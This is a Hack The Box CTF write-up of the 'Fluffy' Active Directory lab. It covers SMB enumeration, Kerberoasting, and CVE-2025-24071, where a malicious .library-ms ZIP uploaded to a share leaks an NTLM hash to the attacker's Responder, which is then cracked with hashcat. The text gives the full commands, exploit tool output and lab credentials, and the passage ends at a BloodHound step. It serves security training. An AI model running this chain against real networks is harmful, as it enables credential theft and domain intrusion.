---
title: Fluffy Hack The Box | Esc16
description: And here we go it’s Maverick, back from the dark shadows to write a new Hack The Box write-up about Active Directory Certificate Services. This time it’s ESC16; there’s a big difference between it and
pubDate: 2025-09-21
tags:
  - Security Research
  - Red Team
  - ADCS
  - ESC16
author: Mohamed Eletrepy (maverick)
readingTime: 22
coverImage: https://cdn-images-1.medium.com/max/800/1*DbJwRRqfPN2JqE3Ooq5dTA.png
---

---

![](https://cdn-images-1.medium.com/max/800/1*DbJwRRqfPN2JqE3Ooq5dTA.png)

### Fluffy Hack The Box | Esc16

And here we go it’s Maverick, back from the dark shadows to write a new Hack The Box write-up about Active Directory Certificate Services. This time it’s ESC16; there’s a big difference between it and ESC9 (we covered ESC9 last time), and we’ll get initial access via a CVE. Ready? Let’s get started.

![](https://cdn-images-1.medium.com/max/800/0*E9QoIYFPoecazLel.gif)

#### Nmap

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# nmap -sCV -Pn -oN nmap 10.10.11.69  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 15:01 EDT  
Nmap scan report for DC01.fluffy.htb (10.10.11.69)  
Host is up (0.16s latency).  
Not shown: 989 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-26 02:01:54Z)  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-05-26T02:03:17+00:00; +7h00m03s from scanner time.  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Not valid before: 2025-04-17T16:04:17  
|_Not valid after: 2026-04-17T16:04:17  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Not valid before: 2025-04-17T16:04:17  
|_Not valid after: 2026-04-17T16:04:17  
|_ssl-date: 2025-05-26T02:03:17+00:00; +7h00m03s from scanner time.  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-05-26T02:03:17+00:00; +7h00m03s from scanner time.  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Not valid before: 2025-04-17T16:04:17  
|_Not valid after: 2026-04-17T16:04:17  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-05-26T02:03:17+00:00; +7h00m03s from scanner time.  
| ssl-cert: Subject: commonName=DC01.fluffy.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb  
| Not valid before: 2025-04-17T16:04:17  
|_Not valid after: 2026-04-17T16:04:17  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-05-26T02:02:37  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 107.66 seconds
```

As you can see, like usual AD Domain Controller stuff: there is Kerberos, LDAP, DNS, SMB. I always love to play with SMB and see what I can do with it see their shares, see if I can upload malicious files, and so on. And in assume-breach scenarios there are a lot of things you must check. I’m talking about it you can read it in: every time you read about AD or a new scenario you’ll learn something new about AD. That’s why we love it.

### 📌SMB Enumeration

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!'  
SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.69 445 DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --users  
SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.69 445 DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!  
SMB 10.10.11.69 445 DC01 -Username- -Last PW Set- -BadPW- -Description-  
SMB 10.10.11.69 445 DC01 Administrator 2025-04-17 15:45:01 0 Built-in account for administering the computer/domain  
SMB 10.10.11.69 445 DC01 Guest <never> 0 Built-in account for guest access to the computer/domain  
SMB 10.10.11.69 445 DC01 krbtgt 2025-04-17 16:00:02 0 Key Distribution Center Service Account  
SMB 10.10.11.69 445 DC01 ca_svc 2025-04-17 16:07:50 0  
SMB 10.10.11.69 445 DC01 ldap_svc 2025-04-17 16:17:00 0  
SMB 10.10.11.69 445 DC01 p.agila 2025-04-18 14:37:08 0  
SMB 10.10.11.69 445 DC01 winrm_svc 2025-05-18 00:51:16 0  
SMB 10.10.11.69 445 DC01 j.coffey 2025-04-19 12:09:55 0  
SMB 10.10.11.69 445 DC01 j.fleischman 2025-05-16 14:46:55 0  
SMB 10.10.11.69 445 DC01 [*] Enumerated 9 local users: FLUFFY  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --shares  
SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.69 445 DC01 [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!  
SMB 10.10.11.69 445 DC01 [*] Enumerated shares  
SMB 10.10.11.69 445 DC01 Share Permissions Remark  
SMB 10.10.11.69 445 DC01 ----- ----------- ------  
SMB 10.10.11.69 445 DC01 ADMIN$ Remote Admin  
SMB 10.10.11.69 445 DC01 C$ Default share  
SMB 10.10.11.69 445 DC01 IPC$ READ Remote IPC  
SMB 10.10.11.69 445 DC01 IT READ,WRITE  
SMB 10.10.11.69 445 DC01 NETLOGON READ Logon server share  
SMB 10.10.11.69 445 DC01 SYSVOL READ Logon server share
```

So first I check the credentials to validate them and of course they’re right (official from Hack The Box). Maybe you’d expect to need Kerberos only, but not this time it worked fine. Next I enumerate for more users; and if you ask why, I’ll tell you: every single user in AD can help you in some way during exploitation random users are useful for password spraying, and some may be kerberoastable or **ASREPRoastable**, right? Finally, I check for shares there’s a default one called IT, so I’ll see what’s on it

But before checking shares files, I’ll look for Kerberoasting or AS-REP Roasting. I’ll show two methods one using netexec and one using Impacket examples.

To use **impacket-getuserspn**, you have to obtain a ticket first it’s Kerberos, so let’s get our TGT and check if there are kerberoastable or AS-REP-roastable users. And yeah, you can use just **impacket-getuserspn** because it detects those two attacks thanks to this [*research*](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# impacket-getTGT fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.10.11.69  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# ntpdate 10.10.11.69  
2025-05-25 23:00:40.196641 (-0400) +25202.664148 +/- 0.072643 10.10.11.69 s1 no-leap  
CLOCK: time stepped by 25202.664148  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# impacket-getTGT fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.10.11.69  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Saving ticket in j.fleischman.ccache
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# export KRB5CCNAME=j.fleischman.ccache  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# impacket-GetUserSPNs -request -dc-ip 10.10.11.69 fluffy.htb/j.fleischman:'J0elTHEM4n1990!'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation  
---------------------- --------- --------------------------------------------- -------------------------- -------------------------- ----------  
ADCS/ca.fluffy.htb ca_svc CN=Service Accounts,CN=Users,DC=fluffy,DC=htb 2025-04-17 12:07:50.136701 2025-05-21 18:21:15.969274  
LDAP/ldap.fluffy.htb ldap_svc CN=Service Accounts,CN=Users,DC=fluffy,DC=htb 2025-04-17 12:17:00.599545 <never>  
WINRM/winrm.fluffy.htb winrm_svc CN=Service Accounts,CN=Users,DC=fluffy,DC=htb 2025-05-17 20:51:16.786913 2025-05-25 22:58:25.900662  
  
  
  
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$50c50e64525a3cc69db1e48a0268afda$42a622ec8cdc281f8697196f9ab69734705b8a1bed41e9269351efbfb03ab92915d658f1eb5c8579e2d5ebac45acdeba2157090b8fce3d2a9b9c1ba688a577c1acc8f3f9d2ef09994bd875ca76a94236f3fae1a50be9fa2b7f7f49666b54ab05c74819  
61e3d3fbfe18e12be455f61597a970e4733a6483147122d794750516c40ba890b1c2a5eabb5364ca408a8efbee00fb8cbe11d098ba41b49835cad6284806cabc8a74a42efa9bcdb073732b9cdf679e24e306d58ec4500c2f8a31787daaf3d8a9adac271f054249b2ce2b47f614e63319e97a98a2fd47a188e361861de3def1bbac185d3d3b626c769102ac0bc  
d79c0134966c82295017e6b56d1eab927bb4da654ba842abb03d5b96f435caa96f4fe6321a2d9ea38f7972cb5a0060b06042cb232eaa9c2fb006826e2369baf3d416d131abf20b141b70c5ce6336f43ee83a430aaef74730b4983e00693998883a67c1929189fa85d1a70cc44ffddb23f679d3245ab28feb72f3dbdb190fa30af5ca8194e9552347d1cabfd8c  
ae300a9d367c6fbfd24ed1e985629110f3fa87023f8040c1ac2c895e9bde50e76608ebc81a0a2c7dcaf8e27d7a5612f15f4f7b4664ef776316775be0b8ae7158776eff46e4ab9fc0beca4ba762e0c43d2ee3266acc654f4b3f7c0c2a328fbb4feca9f15d45bdbfbe3a836c255d1018fb8c19a157fb47e9fe616d77642a201dc5d80fbfaf27e8ae35fa8a1804f  
ae258019b875d0253cb300f85f8f197783f61f9c20a6dbf34bfcfcb61c92ed61259e3c70d22cad1fa4d4b9afb996297803ab85eed0c51ef5c2121259556fb5377dd99fe1b70488e1ae62e2093a26f14f8048975eec916fc8619d372fd3ef37e5c11ab48315ec2aec5882f23d023cc308e6848f0d66d3026de001772312d30438e1065f8cd2c163a08c5b1da0c  
bf843cfec0619a84b69e36c1624112dbfb725693066ef04986aabfead2351b97a5a11c21bf94bb8ac66a54c7a4ccad6114b3f42b3cc08d2dd96c0019d7ed9b396bd49086a651622cf3b337fdc9d366f56a4effd61bc3634c8063a8af85fa8e67adc84316ef9b1919825cb2e962b6e0330869d05acf773012aada408d0ae677713b4975e2520cf9e9486319086  
f52b7ead58c8d498dbfdf5fe8940381921011136dab8e4d53d09147d523d438ffa6455e3c6d73cc32cfe8cfdf70a44038da20ca2014c20e233048d8973fbd77a3846d0e9551e59d2adab8887cf3a222aa334927502c865c3a672f15ffc5c8187e772414e42248ccd88222974296e1cac7eeb32955d05801babf4e24b8ea95fceca0a3540553c2c5dc3ef870dc  
2924cf15cf39691968e6480cecb2bea9b9cc1a6419e2925caf74495521f100cb24b9bd769401e0bb4229a6ac44a318981902f66df8d499a0bd4af1f23d42000e1b50e1467f48387849c49ed958adede0f901f9aacec95a65d9f3492c1d8da2730eb34386323cdb75c3e09baafc47e3e8c5a868c13fb067fa5d2ad8933d28be6d3938a41487d2f888a22e6d464  
13c9a79b30225dca2ebd4f654  
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$4dc5a6f8a53a3f2d241f08e75fe051af$00239ac49b7ffd839cdc282a9cc773fec1224d55aeafb9f8027447eb3f01e7bd3dd4db83803f72617e63406f42b9e5bb711b5e3e8f354743f1d8e97a179747274535ad02cf0cb8b6a910d332dd9d6afc45da464bf097a3e208ff0e69098ffc7493  
42af5098f19ad3a32029cb566fa06ee71b683f812fb307d478b5361999ba64ba9b7d7ad677a1edab864ced0c5cf80613b2fd0151ebf275ba1d29e679628cca81c7365ee26eebecff72a8fbb6eddea3f568b3308c0dcc256c27d4c350e014f5134f8cf5c9cc49eae18174be153a8a48ed4c5515f9feee14dbd9fe91e3137e0298a07f08c2b62f4f2901d1971fa  
321ef888f07567f4c8dba1fcbc0d54410ffbcf144b980fbb8b61f28b368938f10deb359aef57975fddc9665ced0e0ee3df16f6b649f6bee5be2b49a20f319e35606c996ceb109ee05bc2dfe4ebd5327e64f42e84dca776872fea00d7361fb7c0f7c7d8b6c8db1c34c92da4e03b3863080e62d34f014701f4d6524b80de8ec950437fcb2b9580d8f9e0e31169d  
f301bc837e9e9eac2f2452e3ce4d9d0e9ea0a5468222634f72becfc0a5a60a7cd7ff1754bd93b7602ba513079605de7efe7f59bcec9df4f8ff10a9734d7b7683fc02d37c1cdb4efd95617be104dd9ba163f358a72048d2e0dbd39c8880a8beffc3aa523317c4cfabbae642057e5c5fe4a41209ca4ca14b57ad318c756d2ad73305170a2074008e39fb9697ae8  
91bbdd02651f0f9d6d11573cd34c7e6facc847d5a65ee6400e8fc0ef2d8251034c4fe888fe8b36d11bbbf5aeda3c4d8db385ec2ab8398bcd7ba4fa0dbcc4ff9ad4e9da071b315797084f07a711e92df306ec532f2a45b978a722ecc925400136f5b9f9e7ac1f7132b2c7a3e21ac03a76be99a13ece04ddf835c93676a7078a7955b85694dbf124bed4f606afa  
baa47be2305783574dd3b7b7ffbbfaaa45e9368bddd7e2fa76e039b2c11f4f016f0d75becd0e35ebfe2c2a3cd3a538635531aaaceb4582528010bd405fdced87ab5de2292f407527c3ec64ab2bfab1431784758335af9492cb23b63f027abb8543c531dc347dfac0a544af0732fd34cfc4e0cb8c27d717f4cf035eb466c4fc1a9a9207af5218c1436997151ea  
cfb8fc13e57ff7f02a1f1a33b876ced35da85a0a14ccb4f39170049cb6d87ed2ea7a026314a982242d02c42adc5e218d62818b0742abb7cbf0c00c4afbd53a823f87c053bac4c2ca9f0b6067811e473a369bcef79d62183cdc69b6fe58bbfc7bfe22a043b478c1a10f62732fa2b117e9934fae0ce6247efa0acdc7eda04a29ef36a7892abf393f5509fda0f2d  
a7f11edd43423614f3f685b67fa4b587d7c462a35302f9a87be45d17983d157ed05e45e4c23424a152ba5ac9e0d61ce9f0f25c49f03b693d7ac64509a5210594c19c15ffc5cc208d38124db104c9ccd0556a6e9229120782db20aeaf8086eda2b24caa879b5070bc48fbc90189ff7595a29c4a654bbb08f81fcd68bf3d4f18ff5f4a8264a5b580eb3af1f04d6  
dd7377305647bd9f60eb5f3c43941  
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$db1e46332d1aee87604606059c9c2ad9$30af97148aebf0ad187651b7f31a54eab1536ffda723a9353030eac580f16da62e411ec2bc3f467d8d08ba238f4307d0a0e3b6df32685239fabb4b3e9776886150ee7a4b9ac11b7fe2e15cb49a1c2954969c0a93e77f1a0335d13234cd9c41ab  
5be61eedd0a82ef576bfa4d19a6f4bd84bb50c0fa08db2df7e6cb8845f8808123d2d472ba26f4c2ab9bf7aca85baea7ed9bdb203f2c5eb791df7dd4087569e4510316af7a2f9365a73200120bd556f629c338c5dbfbec49c798245a87392c352fcdd8372b7e5557658ea0cf436fe7f5fc857b80ada7e01a7f74f347377b43896042e9a1f9f97d52c81e7ab5e7  
9ddfcd2b9db5d9a6a29ce7b21f5e945b08701dfd02d0ce00e846d2815aec262b7f543f178cd00ca3db2d428f3fc032835f17271ad20969c2e84f960b1745a362cc9e0e5a234e276119795ec96b7d95c4e51210e6ea4e84641bdb1920c0147e3e38fc361f983f0d095e8df1267a04e88ad88669142a7e6e2886571b843b09acca88273b11c7e24103769e7cc11  
5b416a248823c3c4d5ae9688d0ead54a2b8a7add369f7f64ed781cefc95ebbac5ec4fae2a4cde906a7d92e19d7f36078762ecca09ffc0e29930b48eeae2558f40462428964669fbbb70f4589ed9d14f32b6c310cee8fa890c14e06e36433226ba713c4be9eb69813bea50652b1a4284a2517dc64aa643f2e73797913ea94e0998a10cfb2a0de22ac950046b50  
ebf40dd26ea7aa7753790dc7afa3b4ffeef86acaadba76f1806afb227438e3e366e8e531664976b82a7606bdeb48fe0a6b3d79c79285e3d93f14a66b9e1bf64f7b4810640aaa0c7bd0fed6a8057873064551a88a63f24b6dc596e2355f8a9a1ad21b255e05f1a085b6ed5ced5c563c640e8d23e38bd60ecabc4d7501648fdf70e803cb10c7c700618c4436ec4  
dc0e19c26dc61bf6205442e2346ac297cac639ab6e957d05c1713e4f57935daefc1832c9c3b7d6850ad047d6c48da067ede11f169a77b17ad630b6a03e106c5db14d4c4b2a4358693107cba51f83ec573d4ffde1fca74f0071b8e972d26b858dc3a522a17083fbf7c61d218271eda7f80df0d3a590a7ff54b5892f998bff89551cb582f78a7b9cf03fc4f94e3  
8fff3f9b1a3c62b67e8b29926d30716634324b602ccb8c9ad59988e89d011743a0d4042198ba3fe141710b0ab38e5e6ccdec76d8e4b77e48ff1d9bb9655bd2321169a01c92984477e06f6482be9e7fe0f43d007e6e99c8e3d926c8e2ecbcd392afc0cc39f20884eb3e9d7e5ce25cffdc5977323f6d0fb1358c6f5764b978dca59f21e658a52d5abadaf1f93bc  
5d9893e5ef316dcb0cb18c0fc83d3a20f7166d3270b2261d275a6fc06debe4d0cce47ad939a9d9786d438659521101010218531c77e8d98630ad677864c01cda11a16350bffa1258ec84e7ddaba6bde16f5111af52805337bec4021c1eaa84ae53e0081bec6d70b868b48322a63b621f8778d283de32cef1681987e80812f0cdaffc554a8562b95b31a9750eced665de7b3296b4b05c53cce82277c6
```

If you try cracking any of those with Hashcat, you won’t be able to damn. Maybe it needs a very powerful GPU rig, I don’t know, but it’s not working. I just wanted to confirm that. Okay, let’s finish what we want to do: check the SMB shares, right?

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# smbclientng -d "fluffy.htb" -u 'j.fleischman' -p 'J0elTHEM4n1990!' --host 10.10.11.69  
               _          _ _            _  
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _  
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |  
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |  
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |  
    by @podalirius_                             v3.0.0  |___/  
      
[+] Successfully authenticated to '10.10.11.69' as 'fluffy.htb\j.fleischman'!  
■[\\10.10.11.69\]> shares   
┏━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓  
┃ Share    ┃ Visibility ┃ Type              ┃ Description         ┃  
┡━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩  
│ ADMIN$   │ Hidden     │ DISKTREE, SPECIAL │ Remote Admin        │  
│ C$       │ Hidden     │ DISKTREE, SPECIAL │ Default share       │  
│ IPC$     │ Hidden     │ IPC, SPECIAL      │ Remote IPC          │  
│ IT       │ Visible    │ DISKTREE          │                     │  
│ NETLOGON │ Visible    │ DISKTREE          │ Logon server share  │  
│ SYSVOL   │ Visible    │ DISKTREE          │ Logon server share  │  
└──────────┴────────────┴───────────────────┴─────────────────────┘  
■[\\10.10.11.69\]> use 'IT'  
■[\\10.10.11.69\IT\]> dir  
d-------     0.00 B  2025-09-20 19:57  .\  
d-------     0.00 B  2025-09-20 19:57  ..\  
d-------     0.00 B  2025-05-21 11:12  Everything-1.4.1.1026.x64\  
-a------    1.74 MB  2025-05-21 11:12  Everything-1.4.1.1026.x64.zip  
d-------     0.00 B  2025-05-21 11:12  KeePass-2.58\  
-a------    3.08 MB  2025-05-21 11:12  KeePass-2.58.zip  
-a------  165.98 kB  2025-05-17 10:31  Upgrade_Notice.pdf  
■[\\10.10.11.69\IT\]> get *
```

![](https://cdn-images-1.medium.com/max/800/1*aqCsPFEX3crvIWQHR-hpXA.png)

*Cool right??*

If you ask me why I used smbclient this time, I’ll say I love how it’s organized. As you can see, there are a lot of files, so I downloaded them all to see what they contain hopefully something juicy.

So, after sifting through those files I found **upgrade_Notice.pdf** it’s a pentesting report. Damn, it’s a treasure trove, so I’ll hunt for exploit PoCs for the CVEs mentioned.

![](https://cdn-images-1.medium.com/max/800/1*aDtj7zTN3bt_9s4dpKDyCg.png)

![](https://cdn-images-1.medium.com/max/800/1*F7zFZrawN-Ae4fP8twE_7A.png)

*When you see any CVE, take some time to read the details I used CVE Details for that.*

#### 📌CVE-2025–24071 what it is (short):

A Windows File Explorer vulnerability that can leak NTLM authentication material when Explorer automatically parses `.library-ms` files containing a network (SMB) path. If a malicious `.library-ms` is delivered inside an archive (ZIP/RAR) and Explorer touches it during extraction or preview, the OS can attempt SMB authentication to an attacker-controlled server and expose NTLM responses.

**Why it matters (impact):
** Leaked NTLM hashes/responses let an attacker capture credentials usable for cracking, NTLM relay, or pass-the-hash style attacks — all high value in an AD environment. A leaked response can lead to lateral movement and privilege escalation. Microsoft rated the issue significant and released patches in the March 2025 updates.

**Attack vector (high level):**
 An attacker crafts a `.library-ms` file that includes an SMB UNC path (`\\attacker\share`), places it into an archive, and delivers it (email, download, or shared file). When Explorer processes that file during extraction or preview, it implicitly attempts to contact the UNC path and performs SMB authentication, which the attacker can collect. This requires only file delivery and normal Explorer behavior no elevated privileges.

**Poc :**

> 🔗 [https://github.com/ThemeHackers/CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071)

> 🔗 [https://github.com/Marcejr117/CVE-2025-24071_PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC)

make the evil file that we will uploaded it

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/CVE-2025-24071]  
└─# python exploit.py -f evil -i 10.10.16.26  
  
  
______ ____ ____ _______ ___ ___ ___ _____ ___ _ _ ___ ______ __  
/ |\ \ / / | ____| |__ \ / _ \ |__ \ | ____| |__ \ | || | / _ \ |____ | /_ |  
| ,----' \ \/ / | |__ ______ ) | | | | | ) | | |__ ______ ) | | || |_ | | | | / / | |  
| | \ / | __| |______/ / | | | | / / |___ \ |______/ / |__ _| | | | | / / | |  
| `----. \ / | |____ / /_ | |_| | / /_ ___) | / /_ | | | |_| | / / | |  
\______| \__/ |_______| |____| \___/ |____| |____/ |____| |_| \___/ /_/ |_|  
  
  
Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)  
by ThemeHackers  
  
Creating exploit with filename: evil.library-ms  
Target IP: 10.10.16.26  
  
Generating library file...  
✓ Library file created successfully  
  
Creating ZIP archive...  
✓ ZIP file created successfully  
  
Cleaning up temporary files...  
✓ Cleanup completed  
  
Process completed successfully!  
Output file: exploit.zip  
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Next, upload this file to the SMB share and open Responder as shown in the screenshot.

![](https://cdn-images-1.medium.com/max/1200/1*WpsHiJp7kutrD6EB2wZpvA.png)

*Fire up the Responder with our vpn ip and uploaded the malicious file through smb*

And voilà we have the NetNTLMv2 hash. It’s time to crack it with Hashcat.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# hashcat hash2.txt /usr/share/wordlists/rockyou.txt.gz  
hashcat (v6.2.6) starting in autodetect mode  
  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
============================================================================================================================================  
* Device #1: cpu-penryn-AMD Ryzen 7 4800H with Radeon Graphics, 1438/2941 MB (512 MB allocatable), 4MCU  
  
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.  
The following mode was auto-detected as the only one matching your input hash:  
  
5600 | NetNTLMv2 | Network Protocol  
  
NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!  
Do NOT report auto-detect issues unless you are certain of the hash type.  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 0 MB  
  
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt.gz  
* Passwords.: 14344385  
* Bytes.....: 53357329  
* Keyspace..: 14344385  
  
Cracking performance lower than expected?  
  
* Append -O to the commandline.  
This lowers the maximum supported password/salt length (usually down to 32).  
  
* Append -w 3 to the commandline.  
This can cause your screen to lag.  
  
* Append -S to the commandline.  
This has a drastic speed impact but can be better for specific attacks.  
Typical scenarios are a small wordlist but a large ruleset.  
  
* Update your backend API runtime / driver the right way:  
https://hashcat.net/faq/wrongdriver  
  
* Create more work items to make use of your parallelization power:  
https://hashcat.net/faq/morework  
  
P.AGILA::FLUFFY:b565aa23035342b1:ba6918d0729303f24931f68a55f20c4f:01010000000000000043562992cddb01650b70d4221e4a9a0000000002000800430036003000440001001e00570049004e002d00350043004c00370035005a005300520049004d00380004003400570049004e002d00350043004c00370035005a005300520049004d0038002e0043003600300044002e004c004f00430041004c000300140043003600300044002e004c004f00430041004c000500140043003600300044002e004c004f00430041004c00070008000043562992cddb01060004000200000008003000300000000000000001000000002000005b15e35fede62fd5e357838e9e2d20bcee0ac4b2855deb8b2488830fd50af3ed0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00390031000000000000000000:prometheusx-303  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 5600 (NetNTLMv2)  
Hash.Target......: P.AGILA::FLUFFY:b565aa23035342b1:ba6918d0729303f249...000000  
Time.Started.....: Sun May 25 16:31:26 2025 (10 secs)  
Time.Estimated...: Sun May 25 16:31:36 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........: 421.1 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:4  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 4517888/14344385 (31.50%)  
Rejected.........: 0/4517888 (0.00%)  
Restore.Point....: 4516864/14344385 (31.49%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#1....: promo1992++ -> progree  
Hardware.Mon.#1..: Util: 31%  
  
Started: Sun May 25 16:30:58 2025  
Stopped: Sun May 25 16:31:37 2025
```

Here we go we now have a new user. It’s time to validate it: determine whether I have PowerShell remoting via WinRM, and see what I can do with this account check ADCS, map the domain with BloodHound, or anything else.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# nxc smb 10.10.11.69 -u P.AGILA -p prometheusx-303  
SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.69 445 DC01 [+] fluffy.htb\P.AGILA:prometheusx-303  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# nxc winrm 10.10.11.69 -u P.AGILA -p prometheusx-303  
WINRM 10.10.11.69 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.69 5985 DC01 [-] fluffy.htb\P.AGILA:prometheusx-303
```

Let’s run BloodHound. This step is usually done after SMB enumeration — you could’ve run it earlier since you already had credentials, but I want to do it now 🤣. You can use `rusthound-ce` or `bloodhound-ce-python`, but I’ll take the easy route with `netexec`. **Make sure to always update your tools to get the latest rustls fixes, especially for BloodHound tools.**

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/fluffy/blood_fluffy]  
